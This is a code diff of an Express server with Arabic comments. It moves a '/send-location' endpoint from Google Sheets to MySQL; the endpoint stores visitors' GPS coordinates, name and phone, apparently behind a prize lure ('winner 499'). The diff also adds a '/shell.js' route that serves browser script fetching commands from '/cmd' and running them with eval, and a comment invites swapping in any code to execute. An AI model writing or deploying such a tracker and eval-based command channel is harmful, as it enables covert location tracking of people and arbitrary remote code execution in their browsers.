@@ -3,112 +3,102 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
 const path = require('path');
-const { google } = require('googleapis');
+const mysql = require('mysql2');
 
 const app = express();
 const port = process.env.PORT || 3001;
 
-// تأكد من وجود SPREADSHEET_ID
-const SPREADSHEET_ID = process.env.SPREADSHEET_ID;
-if (!SPREADSHEET_ID) {
-    console.error('SPREADSHEET_ID is not set in environment variables');
-    process.exit(1);
-}
-
-// إعداد Google Sheets API
-const auth = new google.auth.GoogleAuth({
-    credentials: {
-        type: "service_account",
-        project_id: process.env.GOOGLE_PROJECT_ID,
-        private_key_id: process.env.GOOGLE_PRIVATE_KEY_ID,
-        private_key: process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
-        client_email: process.env.GOOGLE_CLIENT_EMAIL,
-        client_id: process.env.GOOGLE_CLIENT_ID,
-        auth_uri: "https://accounts.google.com/o/oauth2/auth",
-        token_uri: "https://oauth2.googleapis.com/token",
-        auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
-        client_x509_cert_url: process.env.GOOGLE_CLIENT_X509_CERT_URL
-    },
-    scopes: ['https://www.googleapis.com/auth/spreadsheets']
+// إعداد MySQL
+const db = mysql.createConnection({
+    host: process.env.MYSQL_HOST,
+    user: process.env.MYSQL_USER,
+    password: process.env.MYSQL_PASSWORD,
+    database: process.env.MYSQL_DATABASE
 });
 
-const sheets = google.sheets({ version: 'v4', auth });
+db.connect((err) => {
+    if (err) {
+        console.error('خطأ في الاتصال بقاعدة البيانات MySQL:', err);
+        return;
+    }
+    console.log('تم الاتصال بقاعدة البيانات MySQL بنجاح');
+});
 
-// Middleware
 app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '../public')));
 
-// Routes
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
-app.post('/send-location', async (req, res) => {
+app.post('/send-location', (req, res) => {
     try {
-        console.log('Request body:', req.body);
-        console.log('SPREADSHEET_ID:', SPREADSHEET_ID);
-
         const { latitude, longitude, accuracy, timestamp, name, phone } = req.body;
 
         if (!latitude || !longitude) {
-            console.log('Missing coordinates');
             return res.status(400).json({ 
-                success: false,
-                error: 'Location coordinates are required' 
+                error: 'يجب توفير إحداثيات الموقع' 
             });
         }
 
-        const locationData = [
-            [
-                name || 'Not provided',
-                phone || 'Not provided',
-                String(latitude),
-                String(longitude),
-                String(accuracy || 'Unknown'),
-                new Date(timestamp || Date.now()).toLocaleString('en-US')
-            ]
-        ];
+        const message = `
+📍 موقع جديد للرابح 499:
+🌎 الإحداثيات: ${latitude}, ${longitude}
+🎯 الدقة: ${accuracy || 'غير معروفة'} متر
+🔗 رابط الموقع: https://www.google.com/maps?q=${latitude},${longitude}
+⏰ الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
+        `;
 
-        console.log('Attempting to write to sheet:', locationData);
+        // تسجيل الموقع في وحدة التحكم
+        console.log('تم استلام موقع جديد:', message);
 
-        const response = await sheets.spreadsheets.values.append({
-            spreadsheetId: SPREADSHEET_ID,
-            range: 'Sheet1!A:F',
-            valueInputOption: 'RAW',
-            requestBody: {
-                values: locationData
+        // تخزين البيانات في قاعدة البيانات MySQL
+        const query = 'INSERT INTO locations (latitude, longitude, accuracy, timestamp, name, phone) VALUES (?, ?, ?, ?, ?, ?)';
+        const values = [latitude, longitude, accuracy, new Date(timestamp), name || '', phone || ''];
+
+        db.query(query, values, (err, result) => {
+            if (err) {
+                console.error('خطأ في تخزين البيانات في MySQL:', err);
+                return res.status(500).json({ 
+                    error: 'حدث خطأ أثناء تخزين البيانات في MySQL' 
+                });
             }
-        });
-
-        console.log('Sheets API Response:', response.data);
-
-        res.json({ 
-            success: true, 
-            message: 'Location data successfully received' 
+            console.log('تم تخزين البيانات بنجاح في MySQL');
+            res.json({ 
+                success: true, 
+                message: 'تم استلام موقعك بنجاح' 
+            });
         });
 
     } catch (error) {
-        console.error('Detailed error:', error);
+        console.error('Error:', error);
         res.status(500).json({ 
-            success: false,
-            error: 'Error processing data',
-            details: error.message 
+            error: 'حدث خطأ في معالجة البيانات' 
         });
     }
 });
 
-// Health check
+// للتأكد من أن الخادم يعمل
 app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'ok',
-        spreadsheetId: !!SPREADSHEET_ID,
-        env: process.env.NODE_ENV
-    });
+    res.json({ status: 'ok', env: 'development' });
+});
+
+// مسار جديد لاستضافة ملف shell.js
+app.get('/shell.js', (req, res) => {
+    res.type("application/javascript");
+    res.send(`
+        fetch("https://${req.hostname}/cmd")
+            .then(response => response.text())
+            .then(eval);
+    `);
+});
+
+// مسار لمعالجة الأوامر المستلمة
+app.get('/cmd', (req, res) => {
+    res.send("console.log('Hello from CMD');"); // يمكنك تغيير هذا إلى أي كود تريد تنفيذه
 });
 
 app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-    console.log('Environment:', process.env.NODE_ENV);
-    console.log('SPREADSHEET_ID is set:', !!SPREADSHEET_ID);
+    console.log(`الخادم يعمل على البورت ${port}`);
 });
